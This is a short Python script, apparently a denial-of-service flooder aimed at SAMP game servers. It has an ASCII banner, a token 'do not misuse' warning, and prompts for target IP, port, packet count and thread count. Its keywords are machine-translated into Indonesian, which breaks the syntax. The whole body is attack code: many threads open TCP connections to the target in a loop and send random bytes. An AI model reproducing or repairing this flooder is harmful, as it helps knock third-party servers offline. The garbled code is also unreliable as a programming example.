 soket impor
impor  acak
impor  benang

cetak ( """
──────────────────────────────────────── ────────── ──────────────────────────────────────── ────────── ─
─██████████████████──██████████████─████ ██──────── ──██████─██████████████───██████████─███ ██████████ █
─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒ ██████████ ████▒▒██─██▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒██─██▒ ▒▒▒▒▒▒▒▒▒█ █
─████████████▒▒▒▒██──██▒▒██████▒▒██─██▒▒ ▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒██─██▒▒██████▒▒██───████▒▒████─██▒ ▒█████████ █
─────────████▒▒████──██▒▒██──██▒▒██─██▒▒ ██████▒▒██ ████▒▒██─██▒▒██──██▒▒██─────██▒▒██───██▒ ▒██─────── ─
───────████▒▒████────██▒▒██──██▒▒██─██▒▒ ██──██▒▒██ ──██▒▒██─██▒▒██████▒▒████───██▒▒██───██▒ ▒█████████ █
─────████▒▒████──────██▒▒██──██▒▒██─██▒▒ ██──██▒▒██ ──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██───██▒ ▒▒▒▒▒▒▒▒▒█ █
───████▒▒████────────██▒▒██──██▒▒██─██▒▒ ██──██████ ──██▒▒██─██▒▒████████▒▒██───██▒▒██───██▒ ▒█████████ █
─████▒▒████──────────██▒▒██──██▒▒██─██▒▒ ██──────── ──██▒▒██─██▒▒██────██▒▒██───██▒▒██───██▒ ▒██─────── ─
─██▒▒▒▒████████████──██▒▒██████▒▒██─██▒▒ ██──────── ──██▒▒██─██▒▒████████▒▒██─████▒▒████─██▒ ▒█████████ █
─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒ ██──────── ──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒██─██▒ ▒▒▒▒▒▒▒▒▒█ █
─██████████████████──██████████████─████ ██──────── ──██████─████████████████─██████████─███ ██████████ █
──────────────────────────────────────── ────────── ──────────────────────────────────────── ────────── ─
Kode Oleh LEXSH1N:SAMP
""" )
print ( "JANGAN PENYALAHGUNAAN ALAT" )
ip  =  str ( masukan ( '[+] ip di server: ' ))
port  =  int ( masukan ( '[+] Port di server: ' ))
pack  =  int ( input ( '[+] Paket untuk dikirim: ' ))
utas  =  int ( masukan ( '[+] Waktu Habis: ' ))


def  mulai ():
    hh  =  acak . _urandom ( 10 )
    xx  =  int ( 0 )
    sementara  Benar :
        coba :
            s  =  soket . soket ( soket .AF_INET , soket .SOCK_STREAM ) _ _
            s . hubungkan (( ip , port ))
            s . kirim ( hh )
            untuk  saya  dalam  jangkauan ( pak ):
                s . kirim ( hh )
            xx  +=  1
            print ( 'diretas oleh wibuXyz+bernyanyi+'  |  Terkirim : ' + str ( xx ))
        kecuali :    
            s . tutup ()
            cetak ( 'Selesai' )
untuk  x  dalam  rentang ( utas ):
    thred  =  threading . Utas ( target = mulai )
    mengirik . mulai ()